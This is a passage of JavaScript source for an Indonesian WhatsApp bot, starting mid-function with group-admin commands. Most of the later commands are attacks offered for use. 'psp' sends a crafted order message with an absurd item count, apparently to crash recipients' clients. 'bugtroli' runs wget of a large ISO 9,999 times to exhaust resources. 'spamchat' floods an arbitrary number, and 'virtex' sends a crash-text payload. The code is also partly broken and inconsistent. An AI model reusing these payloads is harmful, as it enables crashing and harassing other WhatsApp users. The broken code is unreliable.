teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
zeroyt7.groupRemove(from, mentioned)
} else {
mentions(`Perintah di terima, mengeluarkan : @${mentioned[0].split('@')[0]}`, mentioned, true)
yusufz.groupRemove(from, mentioned)
case 'antilinkon' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply("Bot Bukan Admin :)")
if (isAntiLink) return reply('anti link sudah on')
_antilink.push(from)
fs.writeFileSync('./src/antilink.json', JSON.stringify(_antilink))
reply(`\`\`\`✓Sukses mengaktifkan fitur anti link di group\`\`\` *${groupMetadata.subject}*`)
break
case 'antilinkoff' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply("Bot Bukan Admin :)")
if (!isAntiLink) return reply('anti link sudah off sebelumnya')
_antilink.splice(from, 1)
fs.writeFileSync('./src/antilink.json', JSON.stringify(_antilink))
reply(`\`\`\`✓Sukses menonaktifkan fitur anti link di group\`\`\` *${groupMetadata.subject}*`)
break
case 'linkgrup' :
if (!isGroup) return reply(`Khusus Grup`)
if (!isBotGroupAdmins) return reply("Bot Bukan Admin :)")
linkgc = await yusufz.groupInviteCode(from)
yeh = `https://chat.whatsapp.com/${linkgc}\n\nlink Group *${groupName}*`
yusufz.sendMessage(from, yeh, text, { quoted: ftoko })
break
case 'psp': // BUG TROLLI + BUG GC + TROLLI
if (!mek.key.fromMe && !isOwner) return
buf = fs.readFileSync(`${thumb}`)
imeu = await yusufz.prepareMessage('0@s.whatsapp.net', buf, image) 
imeg = imeu.message.imageMessage
res = await yusufz.prepareMessageFromContent(from,{
"orderMessage": {
"orderId": "150453297177375",
"thumbnail": "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",
"itemCount": 1000000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "GUA GK NGERTI",
"message":"entah lah gua nob",
"sellerJid": "62895704368804@s.whatsapp.net",
"token": "AR7i5IXXiMA6NjT0DxcwdcKxhXCy1rOrvlNJzqXPMr8PCg==",
"totalAmount1000": "Rp 25.000.00",
"totalCurrencyCode": "IDR",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:mek1, contextInfo:{}}) 

yusufz.toggleDisappearingMessages(from, 'Awoakwoakwoak')
yusufz.relayWAMessage(res)
break
case 'bugtroli':
if (!mek.key.fromMe && !isOwner) return
				for (let i = 0; i < 9999; i++) {
				exec('wget https://ftp.halifax.rwth-aachen.de/blackarch/iso/blackarch-linux-full-2020.12.01-x86_64.iso', (err, stdout) => {
				if (err) throw err
				console.log('🔥SUKSES🔥')
				console.log('🔥') 
				})
				}
				break
case 'spamchat':
if (isBanned) return reply(mess.only.benned)
if (!isPrem) return reply(`Khusus premium!`)
if (args.length < 1) return reply(`Gini, ${prefix + command} 62895704368804|Hai Kon`)
if (!q.includes('|')) return  reply(`Format Salah\nContoh : ${prefix + command} 62895704367804|Bot`)
                    if (args[0].startsWith('08')) return reply('Gunakan kode bahasa kak')
                    if (args[0].startsWith(`${numown}`)) return reply(`Mau Ngapain Lu Anjc Ngespam Nomor Owner`)
                    const nomorkiri = q.substring(0, q.indexOf('|') - 0)
                    const pesankanan = q.substring(q.lastIndexOf('|') + 1)
                    var nomor = mek.participant
                    tekss = `☠️Spam Chat☠️\n✍️Nomor : @${nomor.split('@s.whatsapp.net')[0]}\n✍️Pesan : ${pesankanan}`
                    yusufz.sendMessage(`${nomorkiri}@s.whatsapp.net`, tekss, text, {quoted: ftoko})
                    yusufz.sendMessage(`${nomorkiri}@s.whatsapp.net`, tekss, text, {quoted: ftoko})
                    yusufz.sendMessage(`${nomorkiri}@s.whatsapp.net`, tekss, text, {quoted: ftoko})
                    yusufz.sendMessage(`${nomorkiri}@s.whatsapp.net`, tekss, text, {quoted: ftoko})
                    yusufz.sendMessage(`${nomorkiri}@s.whatsapp.net`, tekss, text, {quoted: ftoko})
                    reply(`Spam Berhasil!`)
                    break
// fitur ini dibuat karena gabut sahaja:v
// by yusufrmdn:v
case 'virtex':
yusufz.sendMessage(from, virtex, text, {quoted: ftoko})
break
    
/********** END THIS GAME **********/
                    default:            
                    if (body.startsWith(`${prefix + command}`)) {                    
                    anu1 = `Sorry *${pushname}* But Feature Cannot be found in *${prefix}menu*`
                    yusufz.sendMessage(from, anu1, text, {quoted: fak2})
                    }                                       	
              }   
		} catch (e) {
			console.log('Error : %s', color(e, 'red'))
		
		}
	})
}
starts() 
           
